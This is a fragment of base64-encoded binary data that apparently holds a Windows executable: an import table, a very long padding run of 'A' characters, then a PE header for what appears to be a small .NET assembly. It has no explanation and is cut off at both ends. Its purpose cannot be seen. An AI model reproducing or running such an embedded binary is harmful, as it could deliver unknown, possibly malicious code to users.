3JGZWF0dXJlUHJlc2VudAAwBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyABACR2V0Q3VycmVudFByb2Nlc3NJZAAUAkdldEN1cnJlbnRUaHJlYWRJZAAA3QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBUA0luaXRpYWxpemVTTGlzdEhlYWQAagNJc0RlYnVnZ2VyUHJlc2VudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHACAAQAAAAoAAAAAAAAABAACgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//dZgAAAAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAAAE1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwCi5KdZAAAAAAAAAADgAAIBCwEIAAAKAAAACAAAAAAAAO4oAAAAIAAAAEAAAAAAQAAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACUKAAAVwAAAABAAADQBAAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAPQIAAAAIAAAAAoAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAADQBAAAAEAAAAAGAAAADAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAABIAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAA0CgAAAAAAABIAAAAAgAFAJQhAAAABwAAAQAAAAYAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAigEAAAKAAAAKgAbMAIAlQAAAAEAABEAKAUAAAoKBm8GAAAKAAZzBwAACgsGbwgAAAoMCG8JAAAKAm8KAAAKAAhvCwAACg0GbwwAAAoAcw0AAAoTBAAJbw4AAAoTBysVEQdvDwAAChMFABEEEQVvEAAACiYAEQdvEQAAChMIE